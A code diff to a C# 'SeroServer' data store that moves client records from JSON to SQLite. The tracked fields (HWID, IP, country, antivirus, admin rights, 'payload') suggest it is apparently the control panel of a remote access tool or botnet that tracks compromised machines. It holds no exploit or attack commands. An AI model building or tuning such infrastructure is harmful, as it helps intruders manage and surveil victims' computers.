@@ -3,6 +3,7 @@ using System.Collections.ObjectModel;
 using System.IO;
 using System.Text.Json;
 using System.Windows.Data;
+using Microsoft.Data.Sqlite;
 
 namespace SeroServer.Data;
 
@@ -10,20 +11,28 @@ public class DataStore
 {
     private static readonly string DataDir = Path.Combine(
         Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
-    private static readonly string LogPath = Path.Combine(DataDir, "server.log");
-    private static readonly string ClientsPath = Path.Combine(DataDir, "clients.json");
+    private static readonly string LogPath     = Path.Combine(DataDir, "server.log");
+    private static readonly string DbPath      = Path.Combine(DataDir, "clients.db");
+    private static readonly string LegacyJson  = Path.Combine(DataDir, "clients.json");
 
     private static readonly JsonSerializerOptions JsonOpts = new() { WriteIndented = false };
-    private readonly object _lock = new();
+
+    // SQLite connection — kept open for the server lifetime (WAL mode, single writer)
+    private SqliteConnection? _db;
+    private SqliteCommand?    _upsertCmd;
+
+    private readonly object _lock     = new();
     private readonly object _logsLock = new();
-    private volatile bool _clientsDirty;
+
+    // Per-HWID dirty tracking — only flush rows that actually changed
+    private readonly ConcurrentDictionary<string, byte> _dirtyHwids = new();
     private readonly System.Timers.Timer _saveTimer;
 
     // Maintained live — avoids O(n) scan every dashboard refresh
     private int _taggedCount;
     public int TaggedCount => _taggedCount;
 
-    // Rolling 24h connect timestamps — Queue for O(1) Enqueue/Dequeue vs List.RemoveAt(0) O(N)
+    // Rolling 24h connect timestamps
     private readonly object _connectHistLock = new();
     private readonly Queue<DateTime> _connectHistory = new();
 
@@ -42,7 +51,8 @@ public class DataStore
     {
         lock (_connectHistLock) { return [.. _connectHistory]; }
     }
-    private readonly System.Collections.Concurrent.ConcurrentQueue<string> _logQueue = new();
+
+    private readonly ConcurrentQueue<string> _logQueue = new();
     private readonly System.Timers.Timer _logFlushTimer;
 
     public ObservableCollection<string> Logs { get; } = [];
@@ -52,15 +62,17 @@ public class DataStore
 
     public DataStore()
     {
-        // Allow ObservableCollection<string> Logs to be modified from background threads
-        // (TlsServer calls DataStore.Log() from threadpool handlers).
         System.Windows.Data.BindingOperations.EnableCollectionSynchronization(Logs, _logsLock);
 
+        Directory.CreateDirectory(DataDir);
+        OpenDb();
         LoadClients();
+
+        // Flush only dirty rows every 10s — cost is O(dirty) not O(total)
         _saveTimer = new System.Timers.Timer(10_000) { AutoReset = true };
-        _saveTimer.Elapsed += (_, _) => { if (_clientsDirty) { _clientsDirty = false; SaveClientsNow(); } };
+        _saveTimer.Elapsed += (_, _) => FlushDirty();
         _saveTimer.Start();
-        // Flush log lines to disk every 2s — avoids blocking the caller on every log call
+
         _logFlushTimer = new System.Timers.Timer(2_000) { AutoReset = true };
         _logFlushTimer.Elapsed += FlushLogQueue;
         _logFlushTimer.Start();
@@ -71,10 +83,7 @@ public class DataStore
     public void Log(string message)
     {
         var entry = $"[{DateTime.Now:HH:mm:ss}] {message}";
-        // Queue for async disk write — never blocks the caller
         _logQueue.Enqueue(entry);
-        // Dispatch ObservableCollection mutation to UI thread so callers are never blocked
-        // by the O(n) trim. All Logs writes are serialized by the Dispatcher queue.
         System.Windows.Application.Current?.Dispatcher.BeginInvoke(() =>
         {
             lock (_logsLock)
@@ -95,10 +104,8 @@ public class DataStore
         if (_logQueue.IsEmpty) return;
         try
         {
-            Directory.CreateDirectory(DataDir);
             var sb = new System.Text.StringBuilder();
-            while (_logQueue.TryDequeue(out var line))
-                sb.AppendLine(line);
+            while (_logQueue.TryDequeue(out var line)) sb.AppendLine(line);
             File.AppendAllText(LogPath, sb.ToString());
         }
         catch { }
@@ -117,28 +124,26 @@ public class DataStore
         var connectTime = DateTime.UtcNow;
         lock (_lock)
         {
-            record.LastUsername = client.Username;
-            record.LastIP = client.IP;
-            record.LastCountry = client.Country;
+            record.LastUsername    = client.Username;
+            record.LastIP          = client.IP;
+            record.LastCountry     = client.Country;
             if (!string.IsNullOrEmpty(client.CountryCode)) record.LastCountryCode = client.CountryCode;
             record.LastMachineName = client.MachineName;
-            record.LastOS        = client.OS;
-            record.LastPayload   = client.Payload;
-            record.LastAntivirus = client.Antivirus;
-            record.LastIsAdmin   = client.IsAdmin;
+            record.LastOS          = client.OS;
+            record.LastPayload     = client.Payload;
+            record.LastAntivirus   = client.Antivirus;
+            record.LastIsAdmin     = client.IsAdmin;
             if (!string.IsNullOrEmpty(client.CpuName)) record.LastCpuName = client.CpuName;
             if (!string.IsNullOrEmpty(client.GpuName)) record.LastGpuName = client.GpuName;
             record.LastSeen        = connectTime;
             record.LastConnectedAt = connectTime;
             if (client.Port > 0) record.LastPort = client.Port;
             record.ActivityLog.Add(new ActivityEntry { Action = $"Connected from {client.IP} ({client.Username})" });
-
             if (record.ActivityLog.Count > 20)
                 record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
         }
         AddConnectTimestamp(connectTime);
-
-        SaveClients();
+        MarkDirty(client.Hwid);
         return record;
     }
 
@@ -153,7 +158,7 @@ public class DataStore
                 if (record.ActivityLog.Count > 20)
                     record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
             }
-            SaveClients();
+            MarkDirty(hwid);
         }
     }
 
@@ -167,7 +172,7 @@ public class DataStore
                 if (record.ActivityLog.Count > 20)
                     record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
             }
-            SaveClients();
+            MarkDirty(hwid);
         }
     }
 
@@ -180,10 +185,10 @@ public class DataStore
                 bool hadTag = !string.IsNullOrEmpty(record.Tag);
                 bool hasTag = !string.IsNullOrEmpty(tag);
                 record.Tag = tag;
-                if (!hadTag && hasTag)  Interlocked.Increment(ref _taggedCount);
-                else if (hadTag && !hasTag) Interlocked.Decrement(ref _taggedCount);
+                if (!hadTag && hasTag)       Interlocked.Increment(ref _taggedCount);
+                else if (hadTag && !hasTag)  Interlocked.Decrement(ref _taggedCount);
             }
-            SaveClients();
+            MarkDirty(hwid);
         }
     }
 
@@ -192,51 +197,225 @@ public class DataStore
         if (AllClients.TryGetValue(hwid, out var record))
         {
             lock (_lock) { record.AssignedId = assignedId; }
-            // Write immediately — not via the 10-second timer — so AssignedId
-            // survives a server restart even if it happens right after client connect.
-            SaveClientsNow();
+            // Write immediately so the ID survives a crash right after connect
+            UpsertOne(record);
         }
     }
 
     // ── Persistence ─────────────────────────────────
 
-    private void SaveClients() => _clientsDirty = true;
+    public void Save() => FlushDirty();
 
-    public  void Save()         => SaveClientsNow();
+    private void MarkDirty(string hwid) => _dirtyHwids.TryAdd(hwid, 0);
 
-    private void SaveClientsNow()
+    /// <summary>Flush only rows that changed since the last tick.</summary>
+    private void FlushDirty()
     {
+        if (_dirtyHwids.IsEmpty) return;
+        // Drain the dirty set — snapshot keys, then remove as we flush
+        var keys = _dirtyHwids.Keys.ToArray();
+        foreach (var hwid in keys)
+        {
+            if (!AllClients.TryGetValue(hwid, out var record)) continue;
+            UpsertOne(record);
+            _dirtyHwids.TryRemove(hwid, out _);
+        }
+    }
+
+    private void UpsertOne(ClientRecord r)
+    {
+        if (_db == null || _upsertCmd == null) return;
         try
         {
-            Directory.CreateDirectory(DataDir);
-            string json;
-            // Serialize under lock so ActivityLog (List<T>) is not modified mid-enumeration
-            lock (_lock) { json = JsonSerializer.Serialize(AllClients, JsonOpts); }
-            // Atomic write via temp→rename — prevents file corruption on crash mid-write
-            var tmp = ClientsPath + ".tmp";
-            File.WriteAllText(tmp, json);
-            File.Move(tmp, ClientsPath, overwrite: true);
+            string activityJson;
+            lock (_lock) { activityJson = JsonSerializer.Serialize(r.ActivityLog, JsonOpts); }
+
+            lock (_db)
+            {
+                _upsertCmd.Parameters["@hwid"].Value           = r.Hwid;
+                _upsertCmd.Parameters["@assigned_id"].Value    = r.AssignedId;
+                _upsertCmd.Parameters["@tag"].Value            = r.Tag;
+                _upsertCmd.Parameters["@first_seen"].Value     = r.FirstSeen.ToString("O");
+                _upsertCmd.Parameters["@last_seen"].Value      = r.LastSeen.ToString("O");
+                _upsertCmd.Parameters["@last_connected"].Value = r.LastConnectedAt.ToString("O");
+                _upsertCmd.Parameters["@username"].Value       = r.LastUsername;
+                _upsertCmd.Parameters["@ip"].Value             = r.LastIP;
+                _upsertCmd.Parameters["@country"].Value        = r.LastCountry;
+                _upsertCmd.Parameters["@country_code"].Value   = r.LastCountryCode;
+                _upsertCmd.Parameters["@machine"].Value        = r.LastMachineName;
+                _upsertCmd.Parameters["@os"].Value             = r.LastOS;
+                _upsertCmd.Parameters["@payload"].Value        = r.LastPayload;
+                _upsertCmd.Parameters["@antivirus"].Value      = r.LastAntivirus;
+                _upsertCmd.Parameters["@cpu"].Value            = r.LastCpuName;
+                _upsertCmd.Parameters["@gpu"].Value            = r.LastGpuName;
+                _upsertCmd.Parameters["@ram_used"].Value       = r.LastRamUsed;
+                _upsertCmd.Parameters["@ram_total"].Value      = r.LastRamTotal;
+                _upsertCmd.Parameters["@is_admin"].Value       = r.LastIsAdmin ? 1 : 0;
+                _upsertCmd.Parameters["@port"].Value           = r.LastPort;
+                _upsertCmd.Parameters["@activity"].Value       = activityJson;
+                _upsertCmd.ExecuteNonQuery();
+            }
         }
         catch { }
+    }
+
+    // ── SQLite setup ─────────────────────────────────
+
+    private void OpenDb()
+    {
+        _db = new SqliteConnection($"Data Source={DbPath}");
+        _db.Open();
+
+        using var cmd = _db.CreateCommand();
+        // WAL mode: readers never block writers; single server process so no conflict
+        cmd.CommandText = "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;";
+        cmd.ExecuteNonQuery();
+
+        cmd.CommandText = """
+            CREATE TABLE IF NOT EXISTS clients (
+                hwid          TEXT PRIMARY KEY,
+                assigned_id   TEXT NOT NULL DEFAULT '',
+                tag           TEXT NOT NULL DEFAULT '',
+                first_seen    TEXT NOT NULL DEFAULT '',
+                last_seen     TEXT NOT NULL DEFAULT '',
+                last_connected TEXT NOT NULL DEFAULT '',
+                username      TEXT NOT NULL DEFAULT '',
+                ip            TEXT NOT NULL DEFAULT '',
+                country       TEXT NOT NULL DEFAULT '',
+                country_code  TEXT NOT NULL DEFAULT '',
+                machine       TEXT NOT NULL DEFAULT '',
+                os            TEXT NOT NULL DEFAULT '',
+                payload       TEXT NOT NULL DEFAULT '',
+                antivirus     TEXT NOT NULL DEFAULT '',
+                cpu           TEXT NOT NULL DEFAULT '',
+                gpu           TEXT NOT NULL DEFAULT '',
+                ram_used      INTEGER NOT NULL DEFAULT 0,
+                ram_total     INTEGER NOT NULL DEFAULT 0,
+                is_admin      INTEGER NOT NULL DEFAULT 0,
+                port          INTEGER NOT NULL DEFAULT 0,
+                activity      TEXT NOT NULL DEFAULT '[]'
+            )
+            """;
+        cmd.ExecuteNonQuery();
+
+        // Prepared UPSERT — reused for every flush; parameters are set per row
+        _upsertCmd = _db.CreateCommand();
+        _upsertCmd.CommandText = """
+            INSERT INTO clients
+                (hwid,assigned_id,tag,first_seen,last_seen,last_connected,
+                 username,ip,country,country_code,machine,os,payload,antivirus,
+                 cpu,gpu,ram_used,ram_total,is_admin,port,activity)
+            VALUES
+                (@hwid,@assigned_id,@tag,@first_seen,@last_seen,@last_connected,
+                 @username,@ip,@country,@country_code,@machine,@os,@payload,@antivirus,
+                 @cpu,@gpu,@ram_used,@ram_total,@is_admin,@port,@activity)
+            ON CONFLICT(hwid) DO UPDATE SET
+                assigned_id=excluded.assigned_id, tag=excluded.tag,
+                first_seen=excluded.first_seen,   last_seen=excluded.last_seen,
+                last_connected=excluded.last_connected,
+                username=excluded.username,        ip=excluded.ip,
+                country=excluded.country,          country_code=excluded.country_code,
+                machine=excluded.machine,          os=excluded.os,
+                payload=excluded.payload,          antivirus=excluded.antivirus,
+                cpu=excluded.cpu,                  gpu=excluded.gpu,
+                ram_used=excluded.ram_used,        ram_total=excluded.ram_total,
+                is_admin=excluded.is_admin,        port=excluded.port,
+                activity=excluded.activity
+            """;
+        foreach (var name in new[] {
+            "@hwid","@assigned_id","@tag","@first_seen","@last_seen","@last_connected",
+            "@username","@ip","@country","@country_code","@machine","@os","@payload","@antivirus",
+            "@cpu","@gpu","@ram_used","@ram_total","@is_admin","@port","@activity" })
+            _upsertCmd.Parameters.Add(new SqliteParameter(name, ""));
+        _upsertCmd.Prepare();
     }
 
     private void LoadClients()
     {
         try
         {
-            if (!File.Exists(ClientsPath)) return;
-            var json = File.ReadAllText(ClientsPath);
-            var data = JsonSerializer.Deserialize<ConcurrentDictionary<string, ClientRecord>>(json);
+            // ── Migrate from clients.json if DB is empty ──────────────────────
+            using var countCmd = _db!.CreateCommand();
+            countCmd.CommandText = "SELECT COUNT(*) FROM clients";
+            long dbCount = (long)(countCmd.ExecuteScalar() ?? 0L);
+
+            if (dbCount == 0 && File.Exists(LegacyJson))
+            {
+                MigrateFromJson();
+                return;
+            }
+
+            // ── Normal load from SQLite ───────────────────────────────────────
+            using var sel = _db.CreateCommand();
+            sel.CommandText = "SELECT * FROM clients";
+            using var rdr = sel.ExecuteReader();
+            int tagged = 0;
+            while (rdr.Read())
+            {
+                var r = new ClientRecord
+                {
+                    Hwid             = rdr.GetString(0),
+                    AssignedId       = rdr.GetString(1),
+                    Tag              = rdr.GetString(2),
+                    FirstSeen        = ParseDt(rdr.GetString(3)),
+                    LastSeen         = ParseDt(rdr.GetString(4)),
+                    LastConnectedAt  = ParseDt(rdr.GetString(5)),
+                    LastUsername     = rdr.GetString(6),
+                    LastIP           = rdr.GetString(7),
+                    LastCountry      = rdr.GetString(8),
+                    LastCountryCode  = rdr.GetString(9),
+                    LastMachineName  = rdr.GetString(10),
+                    LastOS           = rdr.GetString(11),
+                    LastPayload      = rdr.GetString(12),
+                    LastAntivirus    = rdr.GetString(13),
+                    LastCpuName      = rdr.GetString(14),
+                    LastGpuName      = rdr.GetString(15),
+                    LastRamUsed      = rdr.GetInt64(16),
+                    LastRamTotal     = rdr.GetInt64(17),
+                    LastIsAdmin      = rdr.GetInt32(18) != 0,
+                    LastPort         = rdr.GetInt32(19),
+                    ActivityLog      = ParseActivity(rdr.GetString(20)),
+                };
+                AllClients[r.Hwid] = r;
+                if (!string.IsNullOrEmpty(r.Tag)) tagged++;
+            }
+            _taggedCount = tagged;
+            Log($"[*] Loaded {AllClients.Count} persistent client records from DB.");
+        }
+        catch (Exception ex) { Log($"[!] Failed to load clients: {ex.Message}"); }
+    }
+
+    private void MigrateFromJson()
+    {
+        try
+        {
+            var json = File.ReadAllText(LegacyJson);
+            var data = JsonSerializer.Deserialize<Dictionary<string, ClientRecord>>(json);
             if (data == null) return;
+
             int tagged = 0;
             foreach (var kv in data)
             {
                 AllClients[kv.Key] = kv.Value;
                 if (!string.IsNullOrEmpty(kv.Value.Tag)) tagged++;
+                UpsertOne(kv.Value);
             }
             _taggedCount = tagged;
-            Log($"[*] Loaded {AllClients.Count} persistent client records.");
+            Log($"[*] Migrated {AllClients.Count} records from clients.json → clients.db.");
+
+            // Rename legacy file so migration never runs again
+            File.Move(LegacyJson, LegacyJson + ".bak", overwrite: true);
         }
-        catch (Exception ex) { Log($"[!] Failed to load clients: {ex.Message}"); }
+        catch (Exception ex) { Log($"[!] JSON migration failed: {ex.Message}"); }
+    }
+
+    private static DateTime ParseDt(string s)
+        => DateTime.TryParse(s, null, System.Globalization.DateTimeStyles.RoundtripKind, out var dt)
+           ? dt : DateTime.MinValue;
+
+    private static List<ActivityEntry> ParseActivity(string json)
+    {
+        try { return JsonSerializer.Deserialize<List<ActivityEntry>>(json) ?? []; }
+        catch { return []; }
     }
 }
